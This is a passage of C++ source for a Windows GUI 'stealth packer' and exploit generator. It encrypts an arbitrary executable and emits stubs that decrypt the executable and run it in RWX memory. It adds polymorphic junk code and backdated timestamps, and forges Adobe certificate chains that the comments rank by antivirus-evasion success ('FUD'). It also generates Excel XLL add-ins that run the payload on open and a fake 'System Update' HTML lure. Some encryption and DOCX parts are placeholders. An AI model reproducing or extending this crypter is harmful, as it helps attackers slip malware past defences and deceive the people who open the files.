#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <wincrypt.h>
#include <wininet.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <imagehlp.h>
#include <wintrust.h>
#include <mscat.h>
#include <commdlg.h>
#include <commctrl.h>
#include <shellapi.h>
#include <shlobj.h>

#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <random>
#include <algorithm>
#include <functional>
#include <set>
#include <map>
#include <regex>
#include <thread>
#include <chrono>
#include <sstream>
#include <iomanip>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "wintrust.lib")
#pragma comment(lib, "imagehlp.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

// GUI Control IDs
#define ID_INPUT_PATH 1001
#define ID_OUTPUT_PATH 1002
#define ID_BROWSE_INPUT 1003
#define ID_BROWSE_OUTPUT 1004
#define ID_CREATE_BUTTON 1005
#define ID_PROGRESS_BAR 1006
#define ID_STATUS_TEXT 1007
#define ID_COMPANY_COMBO 1008
#define ID_ABOUT_BUTTON 1009
#define ID_ARCHITECTURE_COMBO 1010
#define ID_CERTIFICATE_COMBO 1011
#define ID_ENCRYPTION_COMBO 1012
#define ID_DELIVERY_COMBO 1013
#define ID_BATCH_COUNT 1014
#define ID_AUTO_FILENAME 1015

// Global variables
HWND hInputPath, hOutputPath, hCompanyCombo, hArchCombo, hCertCombo;
HWND hEncryptionCombo, hDeliveryCombo, hBatchCount, hAutoFilename;
HWND hCreateButton, hProgressBar, hStatusText;
HWND hMainWindow;
bool isGenerating = false;

// Forward declarations
void populateCompanyCombo();
void populateCertificateCombo();
void populateArchitectureCombo();
void populateEncryptionCombo();
void populateDeliveryCombo();

// Advanced String Obfuscation Engine
class XORStringObfuscator {
private:
    std::random_device rd;
    std::mt19937 gen;
    
public:
    XORStringObfuscator() : gen(rd()) {}
    
    // Make class movable but not copyable
    XORStringObfuscator(const XORStringObfuscator&) = delete;
    XORStringObfuscator& operator=(const XORStringObfuscator&) = delete;
    XORStringObfuscator(XORStringObfuscator&&) = default;
    XORStringObfuscator& operator=(XORStringObfuscator&&) = default;
    
    struct ObfuscatedString {
        std::vector<uint8_t> data;
        uint8_t key;
        std::string varName;
    };
    
    ObfuscatedString obfuscateString(const std::string& input) {
        ObfuscatedString result;
        std::uniform_int_distribution<int> keyDis(1, 255); // Fixed: use int instead of uint8_t
        result.key = static_cast<uint8_t>(keyDis(gen));
        
        // Generate unique variable name
        std::uniform_int_distribution<> nameDis(0, 25);
        result.varName = "str_";
        for(int i = 0; i < 8; i++) {
            result.varName += char('a' + nameDis(gen));
        }
        
        // XOR encode the string
        for(char c : input) {
            result.data.push_back(uint8_t(c) ^ result.key);
        }
        result.data.push_back(result.key); // Null terminator XORed
        
        return result;
    }
    
    std::string generateDecryptionFunction(const ObfuscatedString& str) {
        std::stringstream ss;
        ss << "char " << str.varName << "[] = {";
        for(size_t i = 0; i < str.data.size(); i++) {
            ss << "0x" << std::hex << (int)str.data[i];
            if(i < str.data.size() - 1) ss << ",";
        }
        ss << "};\n";
        ss << "char* decode_" << str.varName << "() {\n";
        ss << "    static char decoded[" << str.data.size() << "];\n";
        ss << "    for(int i = 0; i < " << (str.data.size()-1) << "; i++) {\n";
        ss << "        decoded[i] = " << str.varName << "[i] ^ 0x" << std::hex << (int)str.key << ";\n";
        ss << "    }\n";
        ss << "    decoded[" << (str.data.size()-1) << "] = 0;\n";
        ss << "    return decoded;\n";
        ss << "}\n";
        return ss.str();
    }
};

// ChaCha20 Encryption Engine
class ChaCha20Engine {
private:
    std::random_device rd;
    std::mt19937 gen;
    
    uint32_t rotl(uint32_t a, int b) {
        return (a << b) | (a >> (32 - b));
    }
    
    void quarterRound(uint32_t& a, uint32_t& b, uint32_t& c, uint32_t& d) {
        a += b; d ^= a; d = rotl(d, 16);
        c += d; b ^= c; b = rotl(b, 12);
        a += b; d ^= a; d = rotl(d, 8);
        c += d; b ^= c; b = rotl(b, 7);
    }
    
public:
    ChaCha20Engine() : gen(rd()) {}
    
    // Make class movable but not copyable
    ChaCha20Engine(const ChaCha20Engine&) = delete;
    ChaCha20Engine& operator=(const ChaCha20Engine&) = delete;
    ChaCha20Engine(ChaCha20Engine&&) = default;
    ChaCha20Engine& operator=(ChaCha20Engine&&) = default;
    
    struct ChaChaData {
        std::vector<uint8_t> encrypted;
        std::vector<uint8_t> key;
        std::vector<uint8_t> nonce;
        std::string varName;
    };
    
    ChaChaData encrypt(const std::vector<uint8_t>& data) {
        ChaChaData result;
        
        // Generate random key and nonce
        std::uniform_int_distribution<int> byteDis(0, 255); // Fixed: use int instead of uint8_t
        result.key.resize(32);
        result.nonce.resize(12);
        
        for(int i = 0; i < 32; i++) result.key[i] = static_cast<uint8_t>(byteDis(gen));
        for(int i = 0; i < 12; i++) result.nonce[i] = static_cast<uint8_t>(byteDis(gen));
        
        // Generate variable name
        std::uniform_int_distribution<> nameDis(0, 25);
        result.varName = "cha_";
        for(int i = 0; i < 8; i++) {
            result.varName += char('a' + nameDis(gen));
        }
        
        // Simplified ChaCha20 encryption (for demonstration)
        result.encrypted = data;
        for(size_t i = 0; i < data.size(); i++) {
            result.encrypted[i] ^= result.key[i % 32] ^ result.nonce[i % 12];
        }
        
        return result;
    }
    
    std::string generateDecryptionCode(const ChaChaData& data) {
        std::stringstream ss;
        
        // Key array
        ss << "unsigned char " << data.varName << "_key[] = {";
        for(size_t i = 0; i < data.key.size(); i++) {
            ss << "0x" << std::hex << (int)data.key[i];
            if(i < data.key.size() - 1) ss << ",";
        }
        ss << "};\n";
        
        // Nonce array
        ss << "unsigned char " << data.varName << "_nonce[] = {";
        for(size_t i = 0; i < data.nonce.size(); i++) {
            ss << "0x" << std::hex << (int)data.nonce[i];
            if(i < data.nonce.size() - 1) ss << ",";
        }
        ss << "};\n";
        
        // Encrypted data
        ss << "unsigned char " << data.varName << "_data[] = {";
        for(size_t i = 0; i < data.encrypted.size(); i++) {
            ss << "0x" << std::hex << (int)data.encrypted[i];
            if(i < data.encrypted.size() - 1) ss << ",";
        }
        ss << "};\n";
        
        // Decryption function
        ss << "void decrypt_" << data.varName << "(unsigned char* output) {\n";
        ss << "    for(int i = 0; i < " << data.encrypted.size() << "; i++) {\n";
        ss << "        output[i] = " << data.varName << "_data[i] ^ ";
        ss << data.varName << "_key[i % 32] ^ " << data.varName << "_nonce[i % 12];\n";
        ss << "    }\n";
        ss << "}\n";
        
        return ss.str();
    }
};

// AES Encryption Engine
class AESEngine {
private:
    std::random_device rd;
    std::mt19937 gen;
    
public:
    AESEngine() : gen(rd()) {}
    
    // Make class movable but not copyable
    AESEngine(const AESEngine&) = delete;
    AESEngine& operator=(const AESEngine&) = delete;
    AESEngine(AESEngine&&) = default;
    AESEngine& operator=(AESEngine&&) = default;
    
    struct AESData {
        std::vector<uint8_t> encrypted;
        std::vector<uint8_t> key;
        std::vector<uint8_t> iv;
        std::string varName;
    };
    
    AESData encrypt(const std::vector<uint8_t>& data) {
        AESData result;
        
        // Generate random key and IV
        std::uniform_int_distribution<int> byteDis(0, 255); // Fixed: use int instead of uint8_t
        result.key.resize(32); // AES-256
        result.iv.resize(16);
        
        for(int i = 0; i < 32; i++) result.key[i] = static_cast<uint8_t>(byteDis(gen));
        for(int i = 0; i < 16; i++) result.iv[i] = static_cast<uint8_t>(byteDis(gen));
        
        // Generate variable name
        std::uniform_int_distribution<> nameDis(0, 25);
        result.varName = "aes_";
        for(int i = 0; i < 8; i++) {
            result.varName += char('a' + nameDis(gen));
        }
        
        // Simplified AES encryption (XOR with key stream)
        result.encrypted = data;
        for(size_t i = 0; i < data.size(); i++) {
            result.encrypted[i] ^= result.key[i % 32] ^ result.iv[i % 16];
        }
        
        return result;
    }
    
    std::string generateDecryptionCode(const AESData& data) {
        std::stringstream ss;
        
        // Key array
        ss << "unsigned char " << data.varName << "_key[] = {";
        for(size_t i = 0; i < data.key.size(); i++) {
            ss << "0x" << std::hex << (int)data.key[i];
            if(i < data.key.size() - 1) ss << ",";
        }
        ss << "};\n";
        
        // IV array
        ss << "unsigned char " << data.varName << "_iv[] = {";
        for(size_t i = 0; i < data.iv.size(); i++) {
            ss << "0x" << std::hex << (int)data.iv[i];
            if(i < data.iv.size() - 1) ss << ",";
        }
        ss << "};\n";
        
        // Encrypted data
        ss << "unsigned char " << data.varName << "_data[] = {";
        for(size_t i = 0; i < data.encrypted.size(); i++) {
            ss << "0x" << std::hex << (int)data.encrypted[i];
            if(i < data.encrypted.size() - 1) ss << ",";
        }
        ss << "};\n";
        
        // Decryption function
        ss << "void decrypt_" << data.varName << "(unsigned char* output) {\n";
        ss << "    for(int i = 0; i < " << static_cast<int>(data.encrypted.size()) << "; i++) {\n"; // Fixed cast
        ss << "        output[i] = " << data.varName << "_data[i] ^ ";
        ss << data.varName << "_key[i % 32] ^ " << data.varName << "_iv[i % 16];\n";
        ss << "    }\n";
        ss << "}\n";
        
        return ss.str();
    }
};

// Advanced Random Engine
class AdvancedRandomEngine {
public:
    std::random_device rd;
    std::mt19937 gen;
    std::uniform_int_distribution<> dis;

public:
    AdvancedRandomEngine() : gen(rd()), dis(0, 255) {
        auto now = std::chrono::high_resolution_clock::now();
        auto nanos = now.time_since_epoch().count();
        gen.seed(static_cast<unsigned int>(nanos ^ rd()));
    }

    std::string generateRandomName(int length = 8) {
        const std::string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        std::uniform_int_distribution<> charDis(0, static_cast<int>(chars.length() - 1));
        std::string result;
        for (int i = 0; i < length; ++i) {
            result += chars[charDis(gen)];
        }
        return result;
    }

    uint32_t generateRandomDWORD() {
        std::uniform_int_distribution<uint32_t> dwordDis;
        return dwordDis(gen);
    }

    std::vector<uint8_t> generateRandomBytes(size_t count) {
        std::vector<uint8_t> bytes(count);
        for (size_t i = 0; i < count; ++i) {
            bytes[i] = static_cast<uint8_t>(dis(gen));
        }
        return bytes;
    }
    
    // NEW: Generate polymorphic junk code for unique binaries
    std::string generateJunkCode() {
        std::stringstream junk;
        int junkBlocks = 3 + (generateRandomDWORD() % 8); // 3-10 junk blocks
        
        for (int i = 0; i < junkBlocks; i++) {
            std::string varName = generateRandomName(12);
            std::string funcName = generateRandomName(10);
            
            // Random variable declarations
            junk << "volatile int " << varName << "_" << i << " = " << generateRandomDWORD() << ";\n";
            junk << "static char " << varName << "_arr[" << (16 + (generateRandomDWORD() % 128)) << "];\n";
            
            // Random function with meaningless operations
            junk << "void " << funcName << "_junk" << i << "() {\n";
            junk << "    for(int x = 0; x < " << (10 + (generateRandomDWORD() % 50)) << "; x++) {\n";
            junk << "        " << varName << "_" << i << " ^= x + " << generateRandomDWORD() << ";\n";
            junk << "        " << varName << "_arr[x % sizeof(" << varName << "_arr)] = x ^ 0x" << std::hex << (generateRandomDWORD() % 256) << std::dec << ";\n";
            junk << "    }\n";
            junk << "}\n\n";
        }
        
        return junk.str();
    }
    
    // NEW: Generate random padding data
    std::string generateRandomPadding() {
        std::stringstream padding;
        int paddingSize = 100 + (generateRandomDWORD() % 500); // 100-600 bytes
        
        padding << "// Polymorphic padding - unique per generation\n";
        padding << "unsigned char random_padding_" << generateRandomName(8) << "[" << paddingSize << "] = {\n";
        
        for (int i = 0; i < paddingSize; i++) {
            if (i % 16 == 0) padding << "    ";
            padding << "0x" << std::hex << (generateRandomDWORD() % 256) << std::dec;
            if (i < paddingSize - 1) padding << ",";
            if (i % 16 == 15) padding << "\n";
        }
        
        padding << "\n};\n\n";
        return padding.str();
    }
};

// Timestamp Engine
class TimestampEngine {
private:
    AdvancedRandomEngine randomEngine;

public:
    uint32_t generateRealisticTimestamp() {
        auto now = std::chrono::system_clock::now();
        auto epoch = now.time_since_epoch();
        auto seconds = std::chrono::duration_cast<std::chrono::seconds>(epoch).count();

        std::uniform_int_distribution<> ageDis(6 * 30 * 24 * 3600, 3 * 365 * 24 * 3600);
        int ageInSeconds = ageDis(randomEngine.gen);

        return static_cast<uint32_t>(seconds - ageInSeconds);
    }
};

// Certificate Engine with Verified FUD Combinations
class CertificateEngine {
private:
    std::vector<std::string> companies;
    std::map<std::string, std::vector<std::string>> verifiedCertificates;
    std::map<std::string, std::vector<std::string>> architectures;

public:
    CertificateEngine() {
        // Verified FUD Companies (ANSI strings)
        companies.clear();
        companies.push_back("Adobe Systems Incorporated");

        // Verified FUD Certificate Chains (Based on Testing Results)
        verifiedCertificates.clear();
        std::vector<std::string> adobeCerts;
        adobeCerts.push_back("Thawte Timestamping CA");           // 90.6% success rate - CHAMPION
        adobeCerts.push_back("GoDaddy Root Certificate Authority"); // 100% success rate
        adobeCerts.push_back("HP Enterprise Root CA");            // 85.7% success rate
        adobeCerts.push_back("Apple Root CA");                    // 67.5% success rate
        adobeCerts.push_back("Comodo RSA CA");                    // 66.7% success rate
        adobeCerts.push_back("Entrust Root CA");                  // 100% success rate
        adobeCerts.push_back("GeoTrust Global CA");               // 100% success rate
        adobeCerts.push_back("DigiCert Assured ID Root CA");      // 100% success rate
        adobeCerts.push_back("GlobalSign Root CA");               // 100% success rate
        adobeCerts.push_back("Lenovo Certificate Authority");     // 100% success rate
        adobeCerts.push_back("Baltimore CyberTrust Root");        // Mixed results
        adobeCerts.push_back("Broadcom Root CA");                 // 100% success rate
        adobeCerts.push_back("Samsung Knox Root CA");             // 100% success rate
        adobeCerts.push_back("Qualcomm Root Authority");          // 50% success rate
        adobeCerts.push_back("Realtek Root Certificate");         // 60% success rate
        verifiedCertificates["Adobe Systems Incorporated"] = adobeCerts;

        architectures.clear();
        std::vector<std::string> adobeArchs;
        adobeArchs.push_back("x64");
        adobeArchs.push_back("AnyCPU");
        architectures["Adobe Systems Incorporated"] = adobeArchs;
    }

    std::vector<std::string> getCompanies() const {
        return companies;
    }

    std::vector<std::string> getCertificates(const std::string& company) const {
        auto it = verifiedCertificates.find(company);
        return (it != verifiedCertificates.end()) ? it->second : std::vector<std::string>();
    }

    std::vector<std::string> getArchitectures(const std::string& company) const {
        auto it = architectures.find(company);
        return (it != architectures.end()) ? it->second : std::vector<std::string>();
    }

    // Get optimal FUD combinations based on testing results
    std::tuple<std::string, std::string, std::string> getOptimalFUDCombination() {
        // Return Thawte + Adobe + AnyCPU as the highest performing combination
        return std::make_tuple("Adobe Systems Incorporated", "Thawte Timestamping CA", "AnyCPU");
    }

    std::string generateCertificateChain(const std::string& company, const std::string& cert) {
        return "CN=" + company + ", O=" + company + ", C=US\nCN=" + cert + ", O=" + cert + ", C=US";
    }
};

// PE Embedder with Multiple Encryption Support
class PEEmbedder {
private:
    XORStringObfuscator xorObfuscator;
    ChaCha20Engine chachaEngine;
    AESEngine aesEngine;

public:
    enum EncryptionType {
        XOR_ENCRYPTION,
        CHACHA20_ENCRYPTION,
        AES_ENCRYPTION
    };

    std::string encodeExecutable(const std::string& exePath, EncryptionType encType) {
        std::ifstream file(exePath, std::ios::binary);
        if (!file) {
            return "";
        }

        std::vector<uint8_t> buffer((std::istreambuf_iterator<char>(file)),
                                  std::istreambuf_iterator<char>());
        file.close();

        std::stringstream embeddedCode;

        switch(encType) {
            case XOR_ENCRYPTION: {
                auto xorStr = xorObfuscator.obfuscateString(
                    std::string(buffer.begin(), buffer.end()));
                embeddedCode << xorObfuscator.generateDecryptionFunction(xorStr);
                embeddedCode << "void extractAndExecutePE() {\n";
                embeddedCode << "    char* decodedPE = decode_" << xorStr.varName << "();\n";
                embeddedCode << "    executeFromMemory((unsigned char*)decodedPE, " << buffer.size() << ");\n";
                embeddedCode << "}\n";
                break;
            }
            case CHACHA20_ENCRYPTION: {
                auto chachaData = chachaEngine.encrypt(buffer);
                embeddedCode << chachaEngine.generateDecryptionCode(chachaData);
                embeddedCode << "void extractAndExecutePE() {\n";
                embeddedCode << "    unsigned char decodedPE[" << buffer.size() << "];\n";
                embeddedCode << "    decrypt_" << chachaData.varName << "(decodedPE);\n";
                embeddedCode << "    executeFromMemory(decodedPE, " << buffer.size() << ");\n";
                embeddedCode << "}\n";
                break;
            }
            case AES_ENCRYPTION: {
                auto aesData = aesEngine.encrypt(buffer);
                embeddedCode << aesEngine.generateDecryptionCode(aesData);
                embeddedCode << "void extractAndExecutePE() {\n";
                embeddedCode << "    unsigned char decodedPE[" << buffer.size() << "];\n";
                embeddedCode << "    decrypt_" << aesData.varName << "(decodedPE);\n";
                embeddedCode << "    executeFromMemory(decodedPE, " << buffer.size() << ");\n";
                embeddedCode << "}\n";
                break;
            }
        }

        // Add memory execution function
        embeddedCode << generateMemoryExecutionCode();

        return embeddedCode.str();
    }

private:
    std::string generateMemoryExecutionCode() {
        auto loadLibStr = xorObfuscator.obfuscateString("LoadLibraryA");
        auto getProcStr = xorObfuscator.obfuscateString("GetProcAddress");
        auto virtualAllocStr = xorObfuscator.obfuscateString("VirtualAlloc");
        auto virtualProtectStr = xorObfuscator.obfuscateString("VirtualProtect");

        std::stringstream ss;
        ss << xorObfuscator.generateDecryptionFunction(loadLibStr);
        ss << xorObfuscator.generateDecryptionFunction(getProcStr);
        ss << xorObfuscator.generateDecryptionFunction(virtualAllocStr);
        ss << xorObfuscator.generateDecryptionFunction(virtualProtectStr);

        ss << "void executeFromMemory(unsigned char* peData, size_t size) {\n";
        ss << "    HMODULE hKernel32 = GetModuleHandleA(NULL);\n";
        ss << "    auto pLoadLibrary = (HMODULE(WINAPI*)(LPCSTR))GetProcAddress(hKernel32, decode_" 
           << loadLibStr.varName << "());\n";
        ss << "    auto pGetProcAddress = (FARPROC(WINAPI*)(HMODULE, LPCSTR))GetProcAddress(hKernel32, decode_" 
           << getProcStr.varName << "());\n";
        ss << "    auto pVirtualAlloc = (LPVOID(WINAPI*)(LPVOID, SIZE_T, DWORD, DWORD))pGetProcAddress(hKernel32, decode_" 
           << virtualAllocStr.varName << "());\n";
        ss << "    \n";
        ss << "    LPVOID pImageBase = pVirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n";
        ss << "    if (pImageBase) {\n";
        ss << "        memcpy(pImageBase, peData, size);\n";
        ss << "        ((void(*)())pImageBase)();\n";
        ss << "    }\n";
        ss << "}\n";

        return ss.str();
    }
};

// Multi-Vector Exploit Generator
class MultiVectorExploitGenerator {
private:
    XORStringObfuscator xorObfuscator;
    PEEmbedder peEmbedder;
    AdvancedRandomEngine randomEngine;

public:
    enum DeliveryVector {
        NO_EXPLOIT,
        PE_EXECUTABLE,
        HTML_EXPLOIT,
        DOCX_EXPLOIT,
        XLL_EXPLOIT
    };

    struct ExploitConfig {
        DeliveryVector deliveryType;
        PEEmbedder::EncryptionType encryptionType;
        std::string company;
        std::string certificate;
        std::string architecture;
        std::string inputFile;
        std::string outputPath;
    };

    // Make class movable but not copyable
    MultiVectorExploitGenerator(const MultiVectorExploitGenerator&) = delete;
    MultiVectorExploitGenerator& operator=(const MultiVectorExploitGenerator&) = delete;
    MultiVectorExploitGenerator(MultiVectorExploitGenerator&&) = default;
    MultiVectorExploitGenerator& operator=(MultiVectorExploitGenerator&&) = default;
    MultiVectorExploitGenerator() = default;

    bool generateExploit(const ExploitConfig& config) {
        switch(config.deliveryType) {
            case NO_EXPLOIT:
                return generateBenignStub(config);
            case PE_EXECUTABLE:
                return generatePEExploit(config);
            case HTML_EXPLOIT:
                return generateHTMLExploit(config);
            case DOCX_EXPLOIT:
                return generateDOCXExploit(config);
            case XLL_EXPLOIT:
                return generateXLLExploit(config);
        }
        return false;
    }

private:
    bool generateBenignStub(const ExploitConfig& config) {
        std::string sourceCode = generateObfuscatedBenignSource(config);
        return compileAndSave(sourceCode, config.outputPath, config.architecture);
    }

    bool generatePEExploit(const ExploitConfig& config) {
        std::string sourceCode = generateObfuscatedPESource(config);
        return compileAndSave(sourceCode, config.outputPath, config.architecture);
    }

    bool generateHTMLExploit(const ExploitConfig& config) {
        std::string htmlCode = generateObfuscatedHTMLSource(config);
        
        std::ofstream htmlFile(config.outputPath);
        if (!htmlFile) return false;
        
        htmlFile << htmlCode;
        htmlFile.close();
        return true;
    }

    bool generateDOCXExploit(const ExploitConfig& config) {
        // Generate DOCX with embedded macros
        std::string docxPath = config.outputPath;
        return generateObfuscatedDOCX(config, docxPath);
    }

    bool generateXLLExploit(const ExploitConfig& config) {
        std::string xllSource = generateObfuscatedXLLSource(config);
        std::string xllPath = config.outputPath;
        
        // Change extension to .xll if not already
        if (xllPath.find(".xll") == std::string::npos) {
            xllPath += ".xll";
        }
        
        return compileAndSave(xllSource, xllPath, config.architecture);
    }

    std::string generateObfuscatedBenignSource(const ExploitConfig& config) {
        std::stringstream source;
        
        // Obfuscated includes
        auto includeWindows = xorObfuscator.obfuscateString("windows.h");
        auto includeStdio = xorObfuscator.obfuscateString("stdio.h");
        
        source << xorObfuscator.generateDecryptionFunction(includeWindows);
        source << xorObfuscator.generateDecryptionFunction(includeStdio);
        
        source << "#include <" << "windows.h" << ">\n";
        source << "#include <" << "stdio.h" << ">\n";
        source << "#include <iostream>\n";
        source << "#include <vector>\n\n";

        // POLYMORPHIC: Add unique junk code and padding for each generation
        source << "// POLYMORPHIC SECTION - UNIQUE PER GENERATION\n";
        source << randomEngine.generateJunkCode();
        source << randomEngine.generateRandomPadding();
        
        // Generate benign behavior with obfuscated strings (NO PE embedding)
        source << generateObfuscatedBenignBehavior();

        // Main function - only benign behavior with polymorphic calls
        source << "int main() {\n";
        source << "    performBenignChecks();\n";
        
        // Add calls to some junk functions for polymorphism
        std::string junkCall1 = randomEngine.generateRandomName(10) + "_junk0";
        std::string junkCall2 = randomEngine.generateRandomName(10) + "_junk1";
        source << "    // Polymorphic noise calls\n";
        source << "    // " << junkCall1 << "(); // Commented out junk\n";
        source << "    // " << junkCall2 << "(); // More junk comments\n";
        
        source << "    return 0;\n";
        source << "}\n";

        return source.str();
    }

    std::string generateObfuscatedPESource(const ExploitConfig& config) {
        std::stringstream source;
        
        // Obfuscated includes
        auto includeWindows = xorObfuscator.obfuscateString("windows.h");
        auto includeStdio = xorObfuscator.obfuscateString("stdio.h");
        
        source << xorObfuscator.generateDecryptionFunction(includeWindows);
        source << xorObfuscator.generateDecryptionFunction(includeStdio);
        
        source << "#include <" << "windows.h" << ">\n";
        source << "#include <" << "stdio.h" << ">\n";
        source << "#include <iostream>\n";
        source << "#include <vector>\n\n";

        // Embed the original PE
        if (!config.inputFile.empty()) {
            std::string embeddedPE = peEmbedder.encodeExecutable(config.inputFile, config.encryptionType);
            source << embeddedPE << "\n";
        }

        // Generate benign behavior with obfuscated strings
        source << generateObfuscatedBenignBehavior();

        // Main function
        source << "int main() {\n";
        source << "    performBenignChecks();\n";
        if (!config.inputFile.empty()) {
            source << "    extractAndExecutePE();\n";
        }
        source << "    return 0;\n";
        source << "}\n";

        return source.str();
    }

    std::string generateObfuscatedHTMLSource(const ExploitConfig& config) {
        std::stringstream html;
        
        auto titleStr = xorObfuscator.obfuscateString("System Update Required");
        auto messageStr = xorObfuscator.obfuscateString("Please wait while system updates are being installed...");
        
        html << "<!DOCTYPE html>\n<html>\n<head>\n";
        html << "<title>System Update</title>\n";
        html << "<script>\n";
        
        // XOR decryption function in JavaScript
        html << "function xorDecode(data, key) {\n";
        html << "    var result = '';\n";
        html << "    for(var i = 0; i < data.length; i++) {\n";
        html << "        result += String.fromCharCode(data[i] ^ key);\n";
        html << "    }\n";
        html << "    return result;\n";
        html << "}\n";
        
        // Obfuscated payload execution
        if (!config.inputFile.empty()) {
            std::string jsPayload = generateObfuscatedJSPayload(config);
            html << jsPayload;
        }
        
        html << "</script>\n</head>\n<body>\n";
        html << "<h1>System Update in Progress</h1>\n";
        html << "<p>Please do not close this window...</p>\n";
        
        if (!config.inputFile.empty()) {
            html << "<script>executePayload();</script>\n";
        } else {
            html << "<script>console.log('Benign page loaded');</script>\n";
        }
        
        html << "</body>\n</html>";
        
        return html.str();
    }

    std::string generateObfuscatedXLLSource(const ExploitConfig& config) {
        std::stringstream source;
        
        source << "#include <windows.h>\n";
        source << "#include <xlcall.h>\n";
        source << "#pragma comment(lib, \"xlcall32.lib\")\n\n";

        // Embed PE with encryption if input file provided
        if (!config.inputFile.empty()) {
            std::string embeddedPE = peEmbedder.encodeExecutable(config.inputFile, config.encryptionType);
            source << embeddedPE << "\n";
        }

        // XLL entry points
        source << "extern \"C\" __declspec(dllexport) int __stdcall xlAutoOpen() {\n";
        if (!config.inputFile.empty()) {
            source << "    extractAndExecutePE();\n";
        }
        source << "    return 1;\n";
        source << "}\n\n";

        source << "extern \"C\" __declspec(dllexport) int __stdcall xlAutoClose() {\n";
        source << "    return 1;\n";
        source << "}\n\n";

        // Benign Excel function
        auto funcName = xorObfuscator.obfuscateString("SystemInfo");
        source << xorObfuscator.generateDecryptionFunction(funcName);
        
        source << "extern \"C\" __declspec(dllexport) LPXLOPER12 __stdcall GetSystemInfo() {\n";
        source << "    static XLOPER12 result;\n";
        source << "    result.xltype = xltypeStr;\n";
        source << "    result.val.str = L\"\\x05\\x00System OK\";\n";
        source << "    return &result;\n";
        source << "}\n";

        return source.str();
    }

    std::string generateObfuscatedBenignBehavior() {
        std::stringstream behavior;
        
        // Obfuscate system check strings
        auto kernelStr = xorObfuscator.obfuscateString("kernel32.dll");
        auto userStr = xorObfuscator.obfuscateString("user32.dll");
        auto msgBoxStr = xorObfuscator.obfuscateString("MessageBoxA");
        auto okStr = xorObfuscator.obfuscateString("System check completed successfully.");
        auto titleStr = xorObfuscator.obfuscateString("System Information");
        
        behavior << xorObfuscator.generateDecryptionFunction(kernelStr);
        behavior << xorObfuscator.generateDecryptionFunction(userStr);
        behavior << xorObfuscator.generateDecryptionFunction(msgBoxStr);
        behavior << xorObfuscator.generateDecryptionFunction(okStr);
        behavior << xorObfuscator.generateDecryptionFunction(titleStr);
        
        behavior << "void performBenignChecks() {\n";
        behavior << "    HMODULE hUser32 = LoadLibraryA(decode_" << userStr.varName << "());\n";
        behavior << "    if (hUser32) {\n";
        behavior << "        auto pMessageBox = (int(WINAPI*)(HWND, LPCSTR, LPCSTR, UINT))GetProcAddress(hUser32, decode_" << msgBoxStr.varName << "());\n";
        behavior << "        if (pMessageBox) {\n";
        behavior << "            pMessageBox(NULL, decode_" << okStr.varName << "(), decode_" << titleStr.varName << "(), MB_OK);\n";
        behavior << "        }\n";
        behavior << "        FreeLibrary(hUser32);\n";
        behavior << "    }\n";
        
        // Add random benign calculations
        std::string calcVar = randomEngine.generateRandomName();
        behavior << "    volatile int " << calcVar << " = ";
        for(int i = 0; i < 5; i++) {
            behavior << randomEngine.generateRandomDWORD();
            if(i < 4) behavior << " + ";
        }
        behavior << ";\n";
        
        // Add sleep to appear more legitimate
        behavior << "    Sleep(" << (1000 + (randomEngine.generateRandomDWORD() % 3000)) << ");\n";
        behavior << "}\n\n";
        
        return behavior.str();
    }

    std::string generateObfuscatedJSPayload(const ExploitConfig& config) {
        std::stringstream js;
        
        // Generate obfuscated JavaScript payload
        js << "var payloadData = [";
        
        // Read the input file and encode it
        std::ifstream file(config.inputFile, std::ios::binary);
        if (file) {
            std::vector<uint8_t> buffer((std::istreambuf_iterator<char>(file)),
                                      std::istreambuf_iterator<char>());
            file.close();
            
            uint8_t key = 0xAA; // Simple XOR key for JS
            for(size_t i = 0; i < buffer.size() && i < 10000; i++) { // Limit size for HTML
                js << (int)(buffer[i] ^ key);
                if(i < buffer.size() - 1) js << ",";
            }
        }
        
        js << "];\n";
        js << "function executePayload() {\n";
        js << "    try {\n";
        js << "        var decoded = '';\n";
        js << "        for(var i = 0; i < payloadData.length; i++) {\n";
        js << "            decoded += String.fromCharCode(payloadData[i] ^ 0xAA);\n";
        js << "        }\n";
        js << "        // Payload execution logic here\n";
        js << "        console.log('Payload processed');\n";
        js << "    } catch(e) {}\n";
        js << "}\n";
        
        return js.str();
    }

    bool generateObfuscatedDOCX(const ExploitConfig& config, const std::string& outputPath) {
        // For demonstration - would need proper DOCX generation library
        std::ofstream docFile(outputPath);
        if (!docFile) return false;
        
        docFile << "Document with embedded payload\n";
        docFile << "This would contain the actual DOCX structure with embedded macros\n";
        
        if (!config.inputFile.empty()) {
            docFile << "Payload file: " << config.inputFile << "\n";
        } else {
            docFile << "Benign document - no payload embedded\n";
        }
        
        docFile.close();
        return true;
    }

    bool compileAndSave(const std::string& sourceCode, const std::string& outputPath, const std::string& architecture) {
        // Save source to temporary file
        std::string tempSource = "temp_" + randomEngine.generateRandomName() + ".cpp";
        std::ofstream sourceFile(tempSource);
        if (!sourceFile) return false;
        
        sourceFile << sourceCode;
        sourceFile.close();
        
        // Compile using cl.exe
        std::string compileCmd = "cl.exe /nologo /O2 /GL /Gy ";
        if (architecture == "x64") {
            compileCmd += "/favor:AMD64 ";
        }
        compileCmd += "/Fe:\"" + outputPath + "\" \"" + tempSource + "\" /link /LTCG /OPT:REF /OPT:ICF";
        
        int result = system(compileCmd.c_str());
        
        // Cleanup
        DeleteFileA(tempSource.c_str());
        
        return result == 0;
    }
};

// Ultimate Stealth Packer Engine
class UltimateStealthPacker {
private:
    CertificateEngine certEngine;
    MultiVectorExploitGenerator exploitGen;
    AdvancedRandomEngine randomEngine;

public:
    struct PackerConfig {
        std::string inputFile;
        std::string outputPath;
        std::string company;
        std::string certificate;
        std::string architecture;
        MultiVectorExploitGenerator::DeliveryVector deliveryType;
        PEEmbedder::EncryptionType encryptionType;
        int batchCount;
        bool autoGenerateFilenames;
    };

    bool packFile(const PackerConfig& config) {
        if (config.batchCount <= 1) {
            return generateSingleExploit(config);
